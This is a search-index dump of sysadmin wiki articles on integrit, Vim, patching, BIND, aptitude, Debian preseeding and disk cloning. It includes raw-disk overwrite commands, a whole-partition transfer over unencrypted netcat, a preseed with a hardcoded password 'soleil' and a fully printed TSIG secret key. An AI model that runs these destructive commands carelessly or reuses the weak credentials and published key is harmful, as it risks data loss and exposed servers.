i\tinode # # p\tpermissions # # l\tnumber of links # # u\tuid # # g\tgid # # z\tfile size (redundant if checksums are on) # # a\taccess time # # m\tmodification time # # c\tctime (time UN*X file info last changed) # # r\treset access time (use with care) # # # ignore directories that are expected to change # # !/cdrom !/dev !/lost+found !/proc !sys # !/etc # !/floppy # !/home # !/mnt # !/root # !/tmp # !/var # # # ignore inode, change time and modification time # # for ephemeral module files. # # /lib/modules/2.4.3/modules.dep IMC # /lib/modules/2.4.3/modules.generic_string IMC # /lib/modules/2.4.3/modules.isapnpmap IMC # /lib/modules/2.4.3/modules.parportmap IMC # /lib/modules/2.4.3/modules.pcimap IMC # /lib/modules/2.4.3/modules.usbmap IMC # # # to cut down on runtime and db size: # # =/usr/include # =/usr/X11R6/include # # =/usr/doc # =/usr/info # =/usr/share # # =/usr/X11R6/man # =/usr/X11R6/lib/X11/fonts # # # ignore user-dependant directories # # !/usr/local # !/usr/src To give you a quick understand of this configuration file:\n!: do not scan this folder/file =: do not search recursively if it’s a folder $: tells not not inherit from the parent folder regarding the checking method /etc MC: this example ask to not check mtime + ctime verification on /etc Now we’re going to initialize the known database:\nintegrit -C /etc/integrit/integrit.conf -u integrit: ---- integrit, version 4.1 ----------------- integrit: output : human-readable integrit: conf file : /etc/integrit/integrit.conf integrit: known db : /var/lib/integrit/known.cdb integrit: current db : /var/lib/integrit/current.cdb integrit: root : / integrit: do check : no integrit: do update : yes Move the current known database to known:\nmv /var/lib/integrit/current.cdb /var/lib/integrit/known.cdb Next and to finish, you can update manually (or let cron do) the database:\nintegrit -C /etc/integrit/integrit.conf -c report This is strongly recommanded that you put the known database on a read only share References link https://sourceforge.net/projects/integrit/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  239 ,
                href: "\/Vim_:_Les_indispendables_\u0026_Quick_Reference_Card\/",
                title: "Vim: Essential Commands \u0026 Quick Reference Card",
                description: "A guide to essential Vim commands including text replacement, functions for file editing, and resources like quick reference cards.",
                content: "References linkHere are some practical commands that I don’t always remember:\nReplace text in the current line:\n:s/original/destination/g Replace text in the entire document:\n:%s/original/destination/g Remove trailing spaces and tabs at the end of lines:\n:%s/\\s\\+$// Here’s also the Quick Reference Card and the same thing but in French :-).\nThe Functions linkHere’s what I consider essential in VIM for good file editing and better navigation:\n\" /etc/vim/vimrc, ~/.vimrc or ~/.exrc \" VIM Configuration File \" Made by Pierre Mavro \" Version 0.3 \" Show matching parentheses set showmatch \" Number the lines set number \" Try to keep the cursor in the same column when changing lines set nostartofline \" Auto-completion options set wildmode=list:full \" Always keep one visible line above the cursor on the screen set scrolloff=1 \" Euro encoding with accents set enc=UTF-8 \" Character font for Gvim that supports the euro symbol set guifont=-misc-fixed-medium-r-semicondensed-*-*-111-75-75-c-*-iso8859-15 \" Activate syntax highlighting syntax on \" Use the standard color scheme colorscheme default \" Display cursor position 'line,column' set ruler \" Searches are not 'case sensitive' set ignorecase \" Highlight searched expressions set hlsearch \" Tabulation section set autoindent set expandtab set shiftwidth=4 set softtabstop=4 set tabstop=4 \" Message function function! s:DisplayStatus(msg) echohl Todo echo a:msg echohl None endfunction \" Mouse state mode let s:mouseActivation = 1 \" Activating / Desactivating mouse mode function! ToogleMouseActivation() if (s:mouseActivation) let s:mouseActivation = 0 set mouse=n set paste call s:DisplayStatus('Paste Mode Desactivated') else let s:mouseActivation = 1 set mouse=a set nopaste call s:DisplayStatus('Paste Mode Activated') endif endfunction \" Activating mouse mode by default \" set mouse=a set paste \" Cleaning function \" Call this function: ':call Clean()' function! Clean() %retab %s/^M//g %s/\\s\\+$// call s:DisplayStatus('Code cleaned') endfunction \" Advanced completion \" Use: 'Ctrl+x \u0026 Ctrl+o | Ctrl+x \u0026 Ctrl+k | Ctrl+x \u0026 Ctrl+n' function! MultipleAutoCompletion() if \u0026omnifunc != '' return \"\\\\\" elseif \u0026dictionary != '' return \"\\\\\" else return \"\\\\\" endif endfunction \" Fold function function! MyFoldFunction() let line = getline(v:foldstart) let sub = substitute(line, '/\\*\\|\\*/\\|^\\s+', '', 'g') let lines = v:foldend - v:foldstart + 1 return '[+] '. v:folddashes.sub . '...' . lines . 'lines...' . getline(v:foldend) endfunction \" Activate Fold function \" Use: za (open or close), zm (close all) or zr (close zr) set foldenable set fillchars=fold:= set foldtext=MyFoldFunction() \" Comment / Uncomment with # or // \" Use: Shift+v, select wished lines and press F5 or F6 map :s.^.#. :noh map :s.^#.. :noh \" Use: Shift+v, select wished lines and press F7 or F8 map :s.^.\\/\\/. :noh map :s.^\\/\\/.. :noh \" Indent or not from 4 spaces \" Use: Shift+v, select wished lines and press F3 or F4 map :s.^ .. :noh map :s.^. . :noh This should be placed in ~/.exrc. You will then have auto-indentation, line numbering, etc.\nIf you want the latest version of my vimrc, go to my git: https://www.deimos.fr/gitweb\nResources linkhttps://vimcasts.org/\nhttps://vim-adventures.com/\nVIM Configuration Generator\nQuick Reference Card\nQuick Reference Card (French)\nThe new and improved Vim editor\n"
            }
        );
    index.add(
            {
                id:  240 ,
                href: "\/Vim_:_Les_indispendables_\u0026_Quick_Reference_Card\/",
                title: "Vim: Essential Commands and Quick Reference Card",
                description: "A guide to essential Vim commands, functions, and configuration options with a quick reference card for Vim users.",
                content: "References linkHere are some useful commands that I don’t always remember:\nReplace text in the current line:\n:s/original/destination/g Replace text throughout the document:\n:%s/original/destination/g Remove unnecessary spaces and tabs at the end of lines:\n:%s/\\s\\+$// Here are also the Quick Reference Card and the same in French :-).\nThe Functions linkHere is what I consider essential in VIM for good file editing and better navigation:\n\" /etc/vim/vimrc, ~/.vimrc or ~/.exrc \" VIM Configuration File \" Made by Pierre Mavro \" Version 0.3 \" Show matching parentheses set showmatch \" Line numbering set number \" Try to keep the cursor in the same column when changing lines set nostartofline \" Auto-completion options set wildmode=list:full \" Always keep one visible line above the cursor on the screen set scrolloff=1 \" Euro encoding with accents set enc=UTF-8 \" Character font for Gvim that supports the euro symbol set guifont=-misc-fixed-medium-r-semicondensed-*-*-111-75-75-c-*-iso8859-15 \" Enable syntax highlighting syntax on \" Use the standard color scheme colorscheme default \" Show cursor position 'line,column' set ruler \" Make searches case insensitive set ignorecase \" Highlight search expressions set hlsearch \" Tabulation section set autoindent set expandtab set shiftwidth=4 set softtabstop=4 set tabstop=4 \" Message function function! s:DisplayStatus(msg) echohl Todo echo a:msg echohl None endfunction \" Mouse state mode let s:mouseActivation = 1 \" Activating / Desactivating mouse mode function! ToogleMouseActivation() if (s:mouseActivation) let s:mouseActivation = 0 set mouse=n set paste call s:DisplayStatus('Paste Mode Desactivated') else let s:mouseActivation = 1 set mouse=a set nopaste call s:DisplayStatus('Paste Mode Activated') endif endfunction \" Activating mouse mode by default \" set mouse=a set paste \" Cleaning function \" Call this function : ':call Clean()' function! Clean() %retab %s/^M//g %s/\\s\\+$// call s:DisplayStatus('Code cleaned') endfunction \" Advanced completion \" Use : 'Ctrl+x \u0026 Ctrl+o | Ctrl+x \u0026 Ctrl+k | Ctrl+x \u0026 Ctrl+n' function! MultipleAutoCompletion() if \u0026omnifunc != '' return \"\\\\\" elseif \u0026dictionary != '' return \"\\\\\" else return \"\\\\\" endif endfunction \" Fold function function! MyFoldFunction() let line = getline(v:foldstart) let sub = substitute(line, '/\\*\\|\\*/\\|^\\s+', '', 'g') let lines = v:foldend - v:foldstart + 1 return '[+] '. v:folddashes.sub . '...' . lines . 'lines...' . getline(v:foldend) endfunction \" Activate Fold function \" Use : za (open or close), zm (close all) or zr (close zr) set foldenable set fillchars=fold:= set foldtext=MyFoldFunction() \" Comment / Uncomment with # or // \" Use : Shift+v, select wished lines and press F5 or F6 map :s.^.#. :noh map :s.^#.. :noh \" Use : Shift+v, select wished lines and press F7 or F8 map :s.^.\\/\\/. :noh map :s.^\\/\\/.. :noh \" Indent or not from 4 spaces \" Use : Shift+v, select wished lines and press F3 or F4 map :s.^ .. :noh map :s.^. . :noh This should be placed in “~/.exrc”. You will then have auto-indentation, line numbering, etc…\nIf you want to get the latest version of my vimrc, go to my git: https://www.deimos.fr/gitweb\nResources linkhttps://vimcasts.org/\nhttps://vim-adventures.com/\nVim Config Generator\nQuick Reference Card\nQuick Reference Card (French)\nThe new and improved Vim editor\n"
            }
        );
    index.add(
            {
                id:  241 ,
                href: "\/Patchs_:_Cr%C3%A9ation_et_applications_de_patchs\/",
                title: "Patches: Creating and Applying Patches",
                description: "A guide on how to create and apply patches in Linux, including the use of diff and patch commands for file modification tracking and distribution.",
                content: "Introduction linkWhen translating or modifying open-source software, it’s important to find a simple and effective way to redistribute your work. To do this, you need to distribute it in the lightest possible manner. The solution is to distribute only the difference between the original version and yours. In short, you need to create a patch.\nPatching linkThis term refers to the action of applying a patch to one or more files. By patching a file, you automatically make the necessary modifications to update it. The patch contains the list of differences between the old and new versions of the file(s). Result: this difference file is much lighter and can be applied in a single operation.\nThe command used to apply a patch in Linux is naturally called patch. This utility, created by Larry Wall (creator of Perl), does more than just “look at” and change files. In fact, patch can react based on context and apply a patch to already modified files.\nCreating a Patch linkTo create a difference file, you need to use the diff command, which analyzes and determines the “contextual differences” between two files. It can be used recursively to analyze files between two distinct directories. Here’s a concrete example to understand how the diff command works:\nLet’s say we have a C source file hello.c.old containing the following text:\n//Demonstration file for diff //Creator :Diamonds Edition 1998 #include void main(void) { printf(\"Hello World !\"); } We modify it to create a French version under the name hello.c, which gives us:\n//Fichier de démonstration pour diff //Créateur :Copyright 2000 Diamond Editions/Linux magazine France 1998 #include void main(void) { printf(\"Bonjour le Monde !\"); } Then, to create a difference file, we use the command:\ndiff -c hello.c.old hello.c \u003e hello.diff The -c indicates a contextual comparison, resulting in a hello.diff file that can then be distributed to anyone who has the English version of hello.c.\nOften, the source code of software is not limited to a single file. The program is distributed across multiple source files that will be compiled, then linked to form the executable program. Translation (and therefore modification) spans multiple files and sometimes multiple subdirectories.\nThe method for creating the patch is to modify the sources in their original directory, then install the original sources in a different directory. Let’s say the /h.old directory contains the English version of hello.c and the /h directory will contain the French version. Place yourself at the root of the disk and type:\ndiff -cr h.old h \u003ehello.diff The resulting hello.diff file will contain the contextual differences between the files in the /h.old directory (the English original) and /h (the French version). The r parameter passed in addition to -c indicates recursive operation.\nTo create a clean and more readable diff:\ndiff -b -Nur h.old h \u003ehello.diff If you want to see a colored diff, use colordiff instead.\nStatistics linkTo get statistics on a diff, you can use the diffstat command:\n$ diff test1 test2 | diffstat unknown | 2 +- 1 file changed, 1 insertion(+), 1 deletion(-) Applying a Patch linkTo apply the patch from the first example, we’ll use:\npatch \u003c hello.diff in the directory where the English hello.c file is located. The patch will be applied and the hello.c file will be modified to become our French version.\nIn the case of a patch applying to multiple files in a directory, copy the .diff file to the root of the disk, then type:\npatch -p0 "
            }
        );
    index.add(
            {
                id:  242 ,
                href: "\/Utilisation_avanc%C3%A9_de_Bind\/",
                title: "Advanced usage of Bind",
                description: "This guide explains advanced techniques for managing BIND DNS servers including zone updates, round-robin load balancing, and troubleshooting common issues.",
                content: "Introduction linkBind is good, but sometimes it becomes a bit complex. Especially when you want to manage DNS servers like providers do. Here are some tips I found to improve the beast.\nForce zone updates linkMethod 1 linkYou may quickly need to update your zones without waiting for Bind to do it itself (see SOA, refresh, etc… for each zone). For this, you must freeze Bind updates on the zones in question:\nrndc freeze deimos.fr in internalview deimos.fr: the zone internalview: the view in which the zone is located You can remove “in ” if you don’t have a defined view. If the action went well, you’ll find this in the logs:\nOct 2 19:05:42 star1 named[8403]: freezing zone 'deimos.fr/IN' internalview: success Now, make the changes you want on your zone file.\nOnce finished, run these commands:\nrndc reload deimos.fr in internalview rndc thaw deimos.fr in internalview reload: reload configuration file and zones. thaw: Enable updates to a frozen dynamic zone and reload it. If all goes well, you’ll see something like this in the logs:\nOct 2 19:09:50 star1 named[8403]: zone deimos.fr/IN/internalview: loaded serial 2008100208 Oct 2 19:09:50 star1 named[8403]: zone deimos.fr/IN/internalview: sending notifies (serial 2008100208) Oct 2 19:09:50 star1 named[8403]: client 192.168.0.27#47874: view internalview: transfer of 'deimos.fr/IN': AXFR-style IXFR started Oct 2 19:09:50 star1 named[8403]: client 192.168.0.27#47874: view internalview: transfer of 'deimos.fr/IN': AXFR-style IXFR ended Oct 2 19:09:54 star1 named[8403]: unfreezing zone 'deimos.fr/IN' internalview: success Method 2 linkHere is a second method, to do the same thing:\nrndc retransfer deimos.fr Round Robin: Load balancer linkFirst of all, you should know that you can only load balance with A records (except apparently for BIND v4 where you can do it with CNAME). Here’s an example of how to manage a domain configuration:\n; Round Robin / Load Balancing www 60 IN A x.x.x.1 www 60 IN A x.x.x.2 60: corresponds to the TTL, and it is very important because it will decide when to switch x.x.x.x: IP addresses of servers. Unfortunately, you cannot use DNS names. You can also choose the type of load balancing among these:\nfixed - records are returned in the order they are defined in the zone file random - records are returned in a random order cyclic - records are returned in a round-robin fashion To do this, add this type of lines and adapt according to your needs:\n... rrset-order { order cyclic; }; ... For more information, see the reference sites below.\nFAQ linkjournal rollforward failed: journal out of sync with zone linkIf you have this error, it’s due to a zone synchronization problem. Look in your logs for the zone(s) causing problems, then delete the sync file:\nrm /etc/bind/db.deimos.fr.jnl All that’s left is to reload or restart your bind and the sync will restart correctly.\nResources linkhttp://jon.netdork.net/2008/08/21/bind-dynamic-zones-and-updates\nhttp://www.zytrax.com/books/dns/\nhttp://www.zytrax.com/books/dns/ch7/queries.html#rrset-order\nhttp://www.zytrax.com/books/dns/info/ttl.html\nhttp://www.zytrax.com/books/dns/ch9/rr.html\n"
            }
        );
    index.add(
            {
                id:  243 ,
                href: "\/apt-aptitude-les-commandes-utiles\/",
                title: "Apt \u0026 Aptitude: Useful Commands",
                description: "A comparison of Apt and Aptitude package management tools in Debian-based Linux distributions, highlighting the advantages of Aptitude",
                content: "Introduction linkBeing an Ubuntu/Debian user (yes, I use and advocate both), I have fallen in love with the Advanced Packaging Tool, also known as apt. Before Ubuntu, I played in the world of RPM hell, with distros such as Red Hat itself, Mandrake (as it was called back then), and even SuSE. I would find some piece of software, try to install it, only to find that it would choke, saying that it relied on some certain dependencies. I would install the dependencies, only to find conflicting versions with newer software. Hell indeed. So when I discovered the Debian way of installing software, I wondered why no one had mentioned it to me before. It was heaven. This is the way to software, I thought.\nApt linkSo, as any new user to the world of apt learns, apt-get is the way to install software in your system. After working on a Debian-based system that uses apt, such as Ubuntu, you also learn the various tools:\napt-get: Installing and removing packages from your system, as well as updating package lists and upgrading the software itself. apt-cache: Search for packages in the package list maintained by apt on the local system dpkg- Used for various administrative tasks to your system, such as reconfiguring Xorg. Those are probably the first few tools that you learn while on a Debian-based distro, if you plan on getting down and dirty at any length. But the buck doesn’t stop there. You need to memorize, and learn other tools, if you are to further administrate your system. These include:\napt-listbugs: See what bugs are listed on a software package before you install it. apt-listchanges: Same thing as apt-listbugs, but for non-bug changes. apt-rdepends: Tool for viewing dependency trees on packages. deborphan- Look for orphaned dependencies on the system left from removing parent packages. debfoster- Helps deborphan identify what package dependencies you no longer need on your system. dselect- Curses interface for viewing, selecting and searching for packages on your system. apt-show-versions -b: show which package comes from which Debian version There’s even more: apt-cdrom, apt-config, apt-extracttemplates, apt-ftparchive, apt-key, apt-mark and apt-sortpkgs.\nIf any of you have noticed, that is 16 different tools that you need to become familiar with, if you are to start learning about your Debian-based distro. I don’t know about you, but doesn’t that seem a bit bass-ackwards? I mean, when I’m using OpenSSH, for example, other than scp, all of the functionality of OpenSSH is filed under one tool: ssh. So, wouldn’t you think that all the functionality of apt would be under one tool, namely just ‘apt’?\nFurther more, apt-get has a big problem that hasn’t really been addressed until only just recently. The problem is in removing packages. You see, apt-get does a great job of indentifying what dependencies need to be installed when you want a certain package, but it fails miserably when you want to remove that package. If dependencies were required, ‘apt-get remove’ will remove your packages, but leave orphaned dependencies on your system. Psychocats.net has a great writeup on this very phenomenon, by simply installing and removing the package kword. The solution? Aptitude.\nNow, before I continue, I want to say that yes, I am aware of ‘apt-get autoremove’ finally being able to handle orphaned dependencies. This is a step in the right direction, for sure. However, apt-get, with its many other tools, is an okay way of doing things, if you like to learn 16 different tools. Aptitude, as I will show you, is one tool for them all.\nAptitude linkAptitude is the superior way to install, remove, upgrade, and otherwise administer packages on you system with apt. For one, since it’s inception, aptitude has been solving orphaned dependencies. Second, it has a curses interface that blows the doors off of dselect. Finally, and most importantly, it takes advantage of one tool, doing many many functions. Let’s take a look:\naptitude: Running it with no arguments brings up a beautiful interface to search, navigate, install, update and otherwise administer packages. aptitude install: Installing software for your system, installing needed dependencies as well. aptitude remove: Removing packages as well as orphaned dependencies. aptitude purge: Removing packages and orphaned dependencies as well as any configuration files left behind. aptitude search: Search for packages in the local apt package lists. aptitude update: Update the local packages lists. aptitude upgrade: Upgrade any installed packages that have been updated. aptitude clean: Delete any downloaded files necessary for installing the software on your system. aptitude dist-upgrade: Upgrade packages, even if it means uninstalling certain packages. aptitude show: Show details about a package name. aptitude autoclean: Delete only out-of-date packages, but keep current ones. aptitude hold: Fix a package at it’s current version, and don’t update it Are we starting to see a pattern here? One command with different readable options (no unnecessary flags). And that’s just the tip of the ice berg. It gets better. For example, when searching for a package using aptitude, the results are sorted alphabetically (gee, imagine that) and justified in column width format. Heck, it will even tell you which one you have installed on your system already, instead of haphazardly listing the packages in some random, unreadable format, like apt-cache.\nI’ve already mentioned it, but aptitude run with no options will pull up a curses application for you to navigate your apt system. If any of you have used it, you know that it is far superior to dselect- talk about a shoddy application. Aptitude makes searching for packages, updating them, removing them, getting details and other necessary tools, easy. Spend 20 minutes inside the console, and you begin to feel like this is an application done right. Spend 20 minutes in dselect, and you’ll begin to get massive headaches, and feel lost inside Pan’s Labyrinth.\nAptitude is just superior to apt-get in every way, shape, and form. Better dependency handling. Better curses application. Better options. ONE tool. Better stdout formatting. The list goes on and on. I see constantly, on forums, IRC and email, the use of apt-get. We need to better educate our brethren and sisters about the proper use of tools, and show them the enlightened way of aptitude. I’ve been using aptitude since I first learned about it, ad will continue to do so the remainder of my Debian/Ubuntu days.\n"
            }
        );
    index.add(
            {
                id:  244 ,
                href: "\/Automatiser_une_installation_de_Debian\/",
                title: "Automate Debian Installation",
                description: "Learn how to automate Debian installation using preseed files to create identical server setups efficiently.",
                content: " Operating System 7.0 Website Debian Website Last Update 07/05/2013 Introduction linkIt’s not always easy to set up 10 identical servers. That’s why this section will help you have a clean and controlled installation.\npreseed.cfg linkYou must first create the preconfiguration file and place it where you want. Here’s the preseed I use for Debian Wheezy (check my Git for the most recent version):\n# Preseed file for Debian # Made by Pierre Mavro / Deimosfr # To create a temporary web server to quickly serve this preseed file, # simply type one of this command in the same folder than preseed: # while true; do nc -l -p 8000 -q 1 \u003c preseed.cfg ; done # python -m SimpleHTTPServer # For more informations: # http://wiki.deimos.fr/Automatiser_une_installation_de_Debian ### Contents of the preconfiguration file (for wheezy) d-i debian-installer/language string en d-i debian-installer/country string FR d-i debian-installer/locale string en_US.UTF-8 ### Keyboard d-i console-keymaps-at/keymap select fr d-i keyboard-configuration/xkb-keymap select fr d-i console-keymaps-at/keymap select fr d-i keymap select fr(latin9) ### Network configuration d-i netcfg/choose_interface select auto d-i netcfg/get_hostname string unassigned-hostname d-i netcfg/get_domain string unassigned-domain d-i netcfg/wireless_wep string ### Apt mirror d-i mirror/protocol string http d-i mirror/country string manual d-i mirror/http/hostname string ftp.fr.debian.org d-i mirror/http/directory string /debian d-i mirror/http/proxy string d-i mirror/suite string wheezy ### Account setup d-i passwd/root-login boolean false d-i passwd/make-user boolean true d-i passwd/root-password password soleil d-i passwd/root-password-again password soleil d-i passwd/user-fullname string Deimos d-i passwd/username string deimos d-i passwd/user-password password soleil d-i passwd/user-password-again password soleil ### Clock and time zone setup d-i clock-setup/utc boolean true d-i time/zone string Europe/Paris d-i clock-setup/ntp boolean true ### Partitioning d-i partman-auto/method string lvm d-i partman-lvm/device_remove_lvm boolean true d-i partman-md/device_remove_md boolean true d-i partman-lvm/confirm boolean true d-i partman-lvm/confirm_nooverwrite boolean true d-i partman-auto-lvm/new_vg_name string vgos # Partition will be: # /boot: ~128M ext4 # /: [1-∞]G LVM ext4 # /var: [768-2048]M LVM ext4 # swap: [RAM*150%-2048]M LVM d-i partman-auto/expert_recipe string \\ boot-root:: \\ 128 3000 128 ext4 \\ $primary{ } \\ $bootable{ } \\ method{ format } format{ } \\ use_filesystem{ } filesystem{ ext4 } \\ mountpoint{ /boot } \\ options/noatime{ noatime } \\ . \\ 1024 4000 -1 ext4 \\ $lvmok{ } \\ method{ format } format{ } \\ use_filesystem{ } filesystem{ ext4 } \\ mountpoint{ / } \\ options/noatime{ noatime } \\ lv_name{ root } \\ . \\ 768 1000 2048 ext4 \\ $lvmok{ } \\ method{ format } format{ } \\ use_filesystem{ } filesystem{ ext4 } \\ mountpoint{ /var } \\ options/noatime{ noatime } \\ lv_name{ var } \\ . \\ 100% 1000 150% linux-swap \\ $lvmok{ } \\ method{ swap } format{ } \\ lv_name{ swap } \\ . d-i partman-partitioning/confirm_write_new_label boolean true d-i partman/choose_partition select finish d-i partman/confirm boolean true d-i partman/confirm_nooverwrite boolean true d-i partman-md/confirm boolean true d-i partman/mount_style select uuid ### Base system installation d-i base-installer/install-recommends boolean false ### Apt setup apt-cdrom-setup apt-setup/cdrom/set-first boolean false d-i apt-setup/non-free boolean true d-i apt-setup/contrib boolean true d-i apt-setup/use_mirror boolean true d-i apt-setup/services-select multiselect security, volatile d-i apt-setup/security_host string security.debian.org d-i apt-setup/volatile_host string volatile.debian.org ### Package selection tasksel tasksel/first multiselect standard d-i pkgsel/upgrade select safe-upgrade popularity-contest popularity-contest/participate boolean true d-i pkgsel/include string openssh-server ### Grub d-i grub-installer/only_debian boolean true d-i grub-installer/with_other_os boolean true # Finish install d-i finish-install/reboot_in_progress note d-i cdrom-detect/eject boolean true I’ve highlighted a little trick to quickly set up a temporary web server to deliver the preseed without having to remake an ISO image. I’ve also highlighted the login and password part (soleil) which should be changed :-)\nLoading the Preconfiguration File linkFor loading this file, you can choose what you want (file, http…) during the installation boot (grub):\n# Web server version preseed/url=http://host/path/to/preseed.cfg # CD version preseed/file=/cdrom/preseed.cfg # USB key version preseed/file=/hd-media/preseed.cfg You can also edit the txt.cfg file on a CD-ROM to tell it where the file is located:\n# isolinux/txt.cfg default install label install menu label ^Install menu default kernel /install.amd/vmlinuz append preseed/file=/cdrom/preseed.cfg auto=true priority=critical lang=fr locale=en_US.UTF-8 console-keymaps-at/keymap=fr-latin9 vga=788 initrd=/install.amd/initrd.gz -- quiet Using a DHCP Server to Specify Preconfiguration Files linkIt’s also possible to use DHCP to specify a file to download from the network. DHCP allows you to specify a filename. Normally this file is used for network booting. If it’s a URL, the installation system that allows network-type preconfiguration will download the file and use it as a preconfiguration file. Here’s an example showing how to configure the dhcpd.conf file belonging to version 3 of the ISC DHCP server (debian package dhcp3-server).\n# /etc/dhcp/dhcpd3.cfg if substring (option vendor-class-identifier, 0, 3) = \"d-i\" { filename \"http://host/preseed.cfg\"; } Note that the above example only allows the file for DHCP clients that identify themselves as “d-i”. Other DHCP clients are not affected. You can also put the text in a paragraph targeted at a single host to avoid preconfiguring all installations done in your network.\nA good way to use this technique is to only preconfigure values related to your network, for example the name of your Debian mirror. This way installations automatically use the right mirror and the rest of the installation can be done interactively. You need to be very careful if you want to automate the entire installation with DHCP-type preconfiguration.\nResources linkhttps://www.debian.org/releases/stable/s390/apbs02.html.fr\nhttps://www.unixgarden.com/index.php/gnu-linux-magazine-hs/une-installation-de-debian-automatique-2\n"
            }
        );
    index.add(
            {
                id:  245 ,
                href: "\/Cloner_un_disque_dur\/",
                title: "Clone a Hard Drive",
                description: "Various methods to clone hard drives in Linux systems including dd, cat, partimage, and over network connections",
                content: "Introduction linkTo clone a disk under Windows, you need to pull out all the tools, and if it’s bootable, then hold on tight… how much does it cost? Obviously, Windows purist pirates will tell me they download a cracked version.\nWhy use such tools and break the law when free and amazing tools exist? Let’s take a look at some options…\nSolutions linkdd linkdd is the ultimate solution. To duplicate a disk with a progress bar:\ndd if=/dev/sda2 of=/dev/sdb2 bs=4096 conv=notrunc,noerror | bar -s 500g Here I’m copying a 500g hard drive. For those who don’t want to use the bar command:\ndd if=/dev/sda2 of=/dev/sdb2 bs=4096 conv=notrunc,noerror \u0026 watch -n5 -- pkill -USR1 ^dd$ To clone a disk remotely:\ndd if=/dev/vgname/lvname bs=1M | ssh root@new-server 'dd of=/dev/vgname/lvname bs=1M' The Partition Table link Method 1 You can, if you wish, simply back up the partition table / MBR (sector 0):\ndd if=/dev/sda of=~/sda.sector0 count=1 Then to restore:\ndd if=~/sda.sector0 of=/dev/sda count=1 Method 2 Here’s another method to save the partition table:\nsfdisk -d /dev/sda \u003e ~/sda.ptbl And to restore it:\nsfdisk /dev/sda \u003c ~/sda.ptbl Across the Network linkNetcat linkOn the target machine:\nnc -l -p 1234 | dd of=/dev/sda1 bs=4k On the source server:\ndd if=/dev/sda1 bs=4k | nc 1234 SSH linkTo do a dd via SSH:\ndd if=/dev/sda1 | ssh user@destination-srv 'dd of=/dev/sda1' Cat linkHere’s the simplest solution for copying an entire disk (partitions, boot sectors…):\ncat /dev/hdx \u003e /dev/hdy hdx: the source disk\nhdy: the destination disk\nPartimage linkThere’s the wonderful Part image software which also allows cloning and even over the network into a disk image :-)\nVerifying Disk Integrity linkOnce the disk is cloned, it’s best to check the integrity of its data (force a check disk at reboot), for example, in ext3:\ntouch /forcefsck Then restart the machine and at the next boot, it will force the check. After that, you can use it without issues.\nCloneZilla linkCloneZilla works a bit like Symantec (Norton) Ghost, it allows you to have a server and create copies over the network:\nBack Up Restore Hard Drives And Partitions With CloneZilla Live\n"
            }
        );
    index.add(
            {
                id:  246 ,
                href: "\/Installation_et_configuration_d\u0027un_serveur_Bind9_primaire_(Master)\/",
                title: "Installing and Configuring a Primary Bind9 Server (Master)",
                description: "A comprehensive guide to installing and configuring a primary Bind9 DNS server, including security settings, zone configurations, and troubleshooting tips.",
                content: "Introduction linkBIND (Berkeley Internet Name Domain) is the most widely used DNS server on the Internet, especially on Unix-like systems. It is currently maintained by the Internet Systems Consortium.\nA new version of BIND (BIND 9) was rewritten to solve some architectural issues in the initial code and to add support for DNSSEC (DNS Security Extensions).\nInstallation linkInstalling Bind9 is quite simple:\naptitude install bind9 dnsutils On OpenBSD, bind is installed by default.\nConfiguration linkhost.conf linkHere’s how to configure the /etc/host.conf file:\norder hosts,bind multi on We are specifying here that requests made from the server should first check the hosts file and then Bind.\nNote: This modification is not needed for OpenBSD.\nrndc.conf linkIntroduction to TSIG Keys linkTransaction signatures (“TSIG”) are a simpler form of DNS security. They use cryptographic hash functions to generate pseudo-signatures of DNS packets. The hash value is a combination of actual DNS data, timestamps to prevent replay attacks, and a shared secret between client and server. Since both entities involved in the DNS lookup must know the shared secret, TSIG signatures can only really be implemented in environments where systems are under common administrative control and where confidentiality of the shared secret can be absolutely guaranteed. In the case of ENUM, this means they can and should be used among ENUM level 0 name servers. For example, they can be used to validate zone transfers or dynamic update requests, with these functions being restricted to trusted clients because they know the shared secret.\nCreating a TSIG Key linkIf you’re on OpenBSD, we’ll simplify things a bit, and to ensure this tutorial has the same paths everywhere, we’ll create a symbolic link:\nln -s /var/named/etc /etc/bind Let’s generate a TSIG key:\ncd /etc/bind dnssec-keygen -a hmac-md5 -b 512 -n HOST simba Replace the number of bits with whatever you want and use your hostname. Replace simba with the name of your server where Bind is installed. Once generated (this may take a few minutes), you will have 2 files:\nThe key that needs to be moved to the bind folder. The rndc.conf file to be created. Here are my 2 generated files:\nKsimba.+157+18808.key Ksimba.+157+18808.private Let’s first move the key and assign it the correct permissions:\nmv Ksimba.+157+18808.key /etc/bind/rndc.key chmod 640 /etc/bind/rndc.key For Debian:\nchown root:bind /etc/bind/rndc.key For OpenBSD:\nchown root:named /etc/bind/rndc.key If I display the content of the other file, I will see the key that will be used (the one that will be used to fill in the following files):\n$ cat Ksimba.+157+18808.private Private-key-format: v1.2 Algorithm: 157 (HMAC_MD5) Key: a4fGtm0fB4zO+4KfqH/zNZ3nPq+ThM5yUCEE7AqzEVI= Bits: AAA= Then let’s create the /etc/bind/rndc.conf file and insert the key:\nkey \"rndc-key\" { algorithm hmac-md5; secret \"a4fGtm0fB4zO+4KfqH/zNZ3nPq+ThM5yUCEE7AqzEVI=\"; }; options { default-key \"rndc-key\"; default-server 127.0.0.1; default-port 953; }; named.conf link // This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \"/etc/bind/named.conf.options\"; include \"/etc/bind/named.conf.local\"; include \"/etc/bind/named.conf.default-zones\"; named.conf.local linkThe acl section allows you to define reusable access lists in other sections of the configuration file. The following definition defines internal clients:\n// // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \"/etc/bind/zones.rfc1918\"; // Acl definition acl \"zoneinterne\" { // IP range authorized to make DNS requests 192.168.0.0/24; 10.8.0.0/24; 127.0.0.1; }; acl \"srvsecondaires\" { // My secondary server x.x.x.x; // Gandi (which offers a secondary DNS) 217.70.177.40; }; Let’s define the logging part:\n// Logs logging { channel xfer-log { file \"/var/log/bind.log\"; print-category yes; print-severity yes; print-time yes; severity info; }; category xfer-in { xfer-log; }; category xfer-out { xfer-log; }; category notify { xfer-log; }; }; Let’s add some security to limit remote administration. If you don’t want to authorize anything, leave the controls section empty:\n// TSIG Security | RNDC Key key \"rndc-key\" { algorithm hmac-md5; secret \"a4fGtm0fB4zO+4KfqH/zNZ3nPq+ThM5yUCEE7AqzEVI=\"; }; controls { inet 127.0.0.1 port 953 allow { 127.0.0.1; \"srvsecondaires\"; } keys { 